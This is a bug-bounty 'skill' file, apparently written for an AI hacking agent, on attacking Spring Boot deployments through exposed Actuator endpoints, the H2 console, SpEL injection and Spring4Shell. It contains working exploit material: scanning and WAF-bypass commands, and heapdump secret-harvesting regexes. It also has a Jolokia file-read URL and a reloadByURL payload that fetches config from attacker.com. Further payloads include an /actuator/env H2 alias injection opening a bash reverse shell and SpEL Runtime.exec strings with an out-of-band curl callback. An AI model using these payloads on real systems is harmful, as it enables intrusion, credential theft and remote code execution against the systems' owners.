---
name: spring-boot-actuator-testing
description: Finding and exploiting exposed Spring Boot Actuator management endpoints — a set of 30+ operational/introspection paths (`/actuator/*`) that Spring Boot apps expose for monitoring, which routinely get shipped to production without auth and leak config/credentials, full heap memory dumps, or allow outright RCE — plus the broader non-Actuator Spring Boot attack surface: direct H2 console access with default credentials, SpEL (Spring Expression Language) injection in user-controlled fields, and Spring4Shell (CVE-2022-22965) classloader manipulation on vulnerable WAR/Tomcat deployments. Covers discovery (Shodan favicon-hash dorking, nuclei actuator/jolokia tags, dirsearch with Spring Boot wordlists, httpx path-probing), WAF/proxy bypass for blocked actuator paths, heapdump credential extraction via strings+regex, Jolokia MBean LFI/RCE (logback XML reload), `/actuator/env` property-injection RCE via H2 datasource query aliasing, and the three non-Actuator techniques above. Use this during Phase 1/3 (Recon/Vulnerability Testing — Info disclosure/Injection) of bughunting-workflow the moment a target fingerprints as Spring Boot (`Whitelabel Error Page`, `X-Application-Context` header, `.jar`/`.war` deployment, Java stack traces, or any `/actuator` path returning JSON instead of 404). Also trigger on mentions of Spring Boot Actuator, actuator endpoints, /actuator/env, /actuator/heapdump, Jolokia, JMXConfigurator, reloadByURL, h2-console, SpEL injection, Spring4Shell, or Spring Boot RCE.
---

# Spring Boot Actuator Exploitation

General technique library for finding and abusing exposed Spring Boot Actuator endpoints. Each dated entry below is a validated technique pulled from a real writeup/source — add new entries here (don't create a new skill) whenever a new writeup covers a different actuator endpoint or exploitation chain than what's already recorded.

## Core theory

Spring Boot Actuator ships as a convenience for ops teams — a family of `/actuator/*` HTTP endpoints that expose the running application's internals (config, env vars, live metrics, JVM state, even a full heap dump) so monitoring tools can scrape them. The vulnerability isn't in Actuator itself, it's near-universal misconfiguration: teams enable it for local/staging convenience, forget Spring Security was never wired up in front of it, and ship straight to production. Because Actuator is a standard library feature (not custom app code), it's identically shaped across thousands of unrelated targets — making it one of the highest signal-to-effort recon checks in Java/Spring shops: one fingerprint check, one dirsearch/nuclei pass, and you either get nothing or you get credentials/RCE.

The severity ladder from least to most damaging:
1. **Read-only info disclosure** (`/env`, `/configprops`, `/beans`, `/mappings`) — config values, sometimes including datasource passwords or API keys if not masked.
2. **Memory disclosure** (`/heapdump`) — a full JVM heap snapshot; anything that was ever in memory (session tokens, decrypted secrets, DB credentials pulled from a connection pool) can be grepped out of it.
3. **JMX/MBean access** (`/jolokia`, `/hawtio`) — lets you invoke arbitrary management beans remotely, which chains to LFI and RCE.
4. **Direct state mutation** (`/env` POST, `/shutdown`, `/restart`, `/refresh`) — writing new config values live, including ones the app doesn't validate the *use* of, which is how `/env` becomes RCE.

## Trigger technique: fingerprint before you fuzz

Don't blind-fuzz `/actuator` across a target list that hasn't been confirmed as Spring Boot — check the tech fingerprint first (`Whitelabel Error Page` body text on a 404, `X-Application-Context` response header, `.jar` in a `Server` banner or deploy artifact name, a Java stack trace anywhere). Once confirmed, this becomes a near-zero-cost check to run against every host in scope — the discovery commands below are cheap and mass-scannable.

## Recorded techniques

### 1. Actuator discovery, heapdump credential harvesting, Jolokia RCE, and `/env` property-injection RCE
Source: [Actuator Unleashed: A Guide to Finding and Exploiting Spring Boot Actuator Endpoints](https://infosecwriteups.com/actuator-unleashed-a-guide-to-finding-and-exploiting-spring-boot-actuator-endpoints-29252dcd9d79)

**Where:** Any Spring Boot deployment (microservices, internal admin tools, APIs) — Actuator ships enabled-by-default in many Spring Boot starter templates, and gets left unauthenticated in production far more often than developers expect.

**Discovery — mass scanning across a target list:**
```bash
# Shodan favicon-hash dorking (pivot off Spring Boot's default favicon or the org's own)
org:target_org http.favicon.hash:116323821
ssl:"example.com" http.favicon.hash:116323821
ssl.cert.subject.CN:"*.example.com" http.favicon.hash:116323821

# nuclei — actuator + jolokia tag-scoped scan across a host list
cat act.txt | nuclei -tags actuator -c 50
cat act.txt | nuclei -tags jolokia -es info,low -silent

# dirsearch with a Spring-Boot-specific wordlist
dirsearch -l target.txt -w /Seclist/Discovery/Web-Content/spring-boot.txt -x 404 -o output.txt

# httpx-toolkit — batch-probe the highest-value paths across many hosts at once
cat targets.txt | httpx-toolkit -silent -threads 50 -path '/actuator,/actuator/health,/actuator/info' -mc 200,401,403,302 > actuators.txt
```

**The endpoint list to probe once `/actuator` itself resolves** (30+): `/actuator`, `/actuator/health`, `/actuator/info`, `/actuator/env`, `/actuator/configprops`, `/actuator/conditions`, `/actuator/beans`, `/actuator/mappings`, `/actuator/metrics`, `/actuator/loggers`, `/actuator/threaddump`, `/actuator/heapdump`, `/actuator/jolokia`, `/actuator/hawtio`, `/actuator/httptrace`, `/actuator/auditevents`, `/actuator/scheduledtasks`, `/actuator/caches`, `/actuator/sessions`, `/actuator/shutdown`, `/actuator/prometheus`, `/actuator/refresh`, `/actuator/restart`. `/env`, `/configprops`, `/beans`, and `/mappings` are the highest-value read-only ones to check first — they're the most likely to leak a credential directly.

**WAF/reverse-proxy bypass** when `/actuator/*` returns 403/blocked at the edge but the backend still serves it (same trust-boundary gap as `403-bypass-testing` — apply that skill's full technique set here too):
- Header spoofing: `X-Forwarded-For: 127.0.0.1`, `X-Original-URL: /actuator/env`, `X-Rewrite-URL: /actuator/env`
- Path manipulation: `/actuator;/env`, `//actuator`, `/actuator//env`, `/./actuator`, `/%2e%2e/actuator`, `/actuator%2Fenv`, `/actuator.json`
- Chained semicolon-separator + encoded-traversal (confirmed against a blocked `/actuator/prometheus` while the parent `/actuator` itself returned 200): `/actuator/prometheus;%2f..%2f..%2f` — the `;` path-parameter separator plus `%2f..%2f..` traversal sequence defeats a path-normalization rule that only matched the literal blocked path, found via the `4-ZERO-3` automation tool (source: [Hunting for Hidden Treasures: Unveiling the 403 Bypass Bug Bounty Adventure](https://freedium-mirror.cfd/https://infosecwriteups.com/hunting-for-hidden-treasures-unveiling-the-403-bypass-bug-bounty-adventure-%EF%B8%8F-%EF%B8%8F-c6d17a0282ac)); same technique family as `403-bypass-testing` category 3 — worth trying against any individually-blocked actuator sub-path even when the parent `/actuator` is already open.
- Verb switching: try `HEAD`/`OPTIONS` if `GET` is blocked — some proxy rules only match one method.

**Heapdump credential extraction** — pull `/actuator/heapdump`, then grep it like a memory forensics artifact:
```bash
strings heapdump | grep -B 2 -A 2 "AKIA"
strings -a -n 6 heapdump | grep -Eo 'AKIA[0-9A-Z]{16}' | sort -u > aws_keys.txt
strings -a -n 10 heapdump | grep -Eo '[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+' | sort -u > jwt_candidates.txt
strings -a -n 10 heapdump | grep -Eo '[A-Za-z0-9_\-]{20,}' | sort -u > long_token_candidates.txt
strings -a -n 6 heapdump.hprof | grep -Ei 'password|passwd|pwd|secret|api[_-]?key|token|auth|authorization|bearer|aws|AKIA|ssh-rsa' -n > possible_secrets.txt
```
A heapdump captures every string that was ever live in the JVM's memory, including decrypted DB passwords/API keys pulled out of a connection pool or config bean — even ones masked in `/env`'s JSON output show up here in plaintext.

**Jolokia LFI** (reads an arbitrary file via a JMX DiagnosticCommand MBean, if `/actuator/jolokia` is exposed):
```
http://domain.com/actuator/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd
```

**Jolokia RCE via forced Logback config reload** — invoke the Logback JMXConfigurator MBean's `reloadByURL` operation to make the target fetch and load an attacker-hosted `logback.xml`, which Logback's config format allows to define arbitrary Java class execution (JNDI/script appenders) — this is how a config-reload primitive becomes RCE:
```
http://domain.com/actuator/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/attacker.com!/logback.xml
```
(Note: source article didn't include the malicious `logback.xml` body itself — for the actual RCE gadget inside that XML, this is the same class of bug as CVE-2021-42392/logback JNDI-lookup or script-appender RCE chains; build the payload XML from a public logback-RCE PoC before firing this at a real target.)

**`/actuator/env` → RCE via H2 datasource property injection** — if the app uses an H2 in-memory/file datasource and `/actuator/env` accepts POST writes, you can inject a `spring.datasource.hikari.connection-test-query` value that H2 executes as SQL on the next connection-pool health check. H2 supports `CREATE ALIAS ... AS` to bind a SQL function directly to a Java method, which is used here to call `Runtime.exec`:
```bash
curl -X POST "http://ip/actuator/env" \
  -H "Content-Type: application/json" \
  -d '{"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS EXEC AS '\''String shellexec(String cmd) throws java.io.IOException { Runtime.getRuntime().exec(new String[]{\"/bin/sh\", \"-c\", cmd}); return \"done\"; }'\''; CALL EXEC('\''bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1'\'');"}'
```
Catch the shell with a listener before firing: `nc -lvnp YOUR_PORT`. This only works when the datasource is actually H2 (check `/actuator/env`'s own output for `spring.datasource.url` containing `jdbc:h2:` first — don't fire this blind against Postgres/MySQL backends, it won't work and just burns a request).

**Impact framing for report:** scale severity to what was actually reachable — `/env`/`/configprops` leaking a live DB or third-party API credential is High; `/heapdump` yielding plaintext secrets is High-to-Critical depending on what's harvested; Jolokia or `/env`-injection RCE is Critical (full remote code execution). Always attach the exact request/response pair and, for the RCE path, a screenshot/output of the reverse shell as proof — don't just claim the endpoint is "exposed," demonstrate what it actually gives an attacker.

**Generalize beyond this article:** treat `/actuator/shutdown`, `/actuator/restart`, and `/actuator/refresh` (state-mutating, unauthenticated-by-default in older Spring Boot versions) as a cheap availability-impact finding even without a full RCE chain — an unauthenticated `/actuator/shutdown` is a one-request DoS worth reporting on its own. Also check `/actuator/httptrace` and `/actuator/auditevents` for session tokens/auth headers leaking out of recent request history, the same info-disclosure logic as `/heapdump` but far cheaper to pull and parse.

### 2. Broader Spring Boot attack surface beyond Actuator — H2 console direct access, SpEL injection, Spring4Shell
Source: [Claude-BugHunter — hunt-springboot skill](https://github.com/elementalsouls/Claude-BugHunter/blob/main/skills/hunt-springboot/SKILL.md)

**Where:** any Spring Boot target, independent of whether Actuator itself is exposed — these three techniques target other common Spring-ecosystem misconfigurations/vulnerabilities, not the `/actuator/*` namespace specifically.

**H2 console direct access (distinct from this skill's existing `/actuator/env` → H2-datasource-property-injection RCE):** many Spring Boot dev/staging deployments leave the H2 web console itself reachable and forget to disable it in production:
```bash
curl -s "http://target/h2-console" -o /dev/null -w "%{http_code}\n"
# also check common base-path variants:
curl -s "http://target/console" -o /dev/null -w "%{http_code}\n"
```
If reachable, try the H2 default credentials (`sa` / empty password) — if they work, the same `CREATE ALIAS ... AS` → `Runtime.exec()` technique this skill already documents for the datasource-injection path applies directly through the console's own SQL input field, no `/actuator/env` write access needed at all. This is a *simpler* path to the same RCE primitive when it's present — check it even when Actuator is fully locked down.

**SpEL (Spring Expression Language) injection** — a general Spring MVC input-validation bug, not Actuator-specific: any user-controlled field that gets evaluated as a Spring expression (search filters, custom validation annotations, some templating integrations) is a direct RCE vector. Test with an arithmetic probe first:
```
${7*7}
#{7*7}
```
A reflected `49` in the response confirms expression evaluation is occurring. Escalate to RCE:
```
${T(java.lang.Runtime).getRuntime().exec("id")}
```
For blind/no-reflection contexts, use an OOB callback instead of relying on visible output:
```
${T(java.lang.Runtime).getRuntime().exec("curl http://<collaborator-domain>/$(whoami)")}
```
A hit on your Interactsh/Burp Collaborator listener confirms command execution even when the response never reflects anything. Cross-reference `rce-exploitation-testing`'s general SSTI detection methodology (`{{7*7}}`) — SpEL injection is the same arithmetic-probe-then-escalate pattern, just Spring's own expression syntax rather than a templating engine's.

**Spring4Shell (CVE-2022-22965)** — affects Spring Framework < 5.3.18 on JDK 9+ deployments packaged as a WAR running on Tomcat: a classloader-manipulation technique abuses Spring's data-binding to pollute Tomcat's logging `Pattern` property via crafted request parameters referencing `class.module.classLoader.resourceLoader`, ultimately writing a JSP webshell to a web-accessible path through the manipulated logging pipeline configuration. Confirm the vulnerable deployment shape first (WAR packaging + Tomcat + Spring Framework version in that range, visible via a verbose error/stack trace or `X-Application-Context` banner) before attempting — this is a narrow, version-and-deployment-specific CVE rather than a general technique, and public PoC scripts exist for the full webshell-write chain once the preconditions are confirmed.

**Other items from this source already fully covered elsewhere in this skill, not duplicated:** heap-dump credential extraction via `strings`+regex, Jolokia MBean enumeration/RCE, and the writable-`/env`-then-`/refresh` config-poisoning chain are all already documented above in entry #1 with the same or greater depth.

**Impact framing:** H2-console direct RCE and SpEL injection RCE are both Critical findings on the same tier as this skill's existing Jolokia/`/env`-injection RCE paths — demonstrate with a reverse shell or OOB callback, not just "the console is reachable"/"the expression evaluates." Spring4Shell is Critical when the full webshell-write chain is confirmed; flag the vulnerable-version-and-deployment-shape alone as a lower-confidence finding if you can't safely complete the write.

**Generalize note:** "Spring Boot hunting" is broader than just the Actuator namespace this skill is named for — any target fingerprinted as Spring Boot deserves a pass through all three techniques here in addition to the Actuator-specific checklist above, since they're independent attack surfaces that can each be present or absent regardless of the others.

<!-- Add new recorded techniques below this line as new Spring Boot Actuator writeups are processed. Keep the same structure: Where / Discovery / Exploit steps / Impact framing / Generalize note. -->
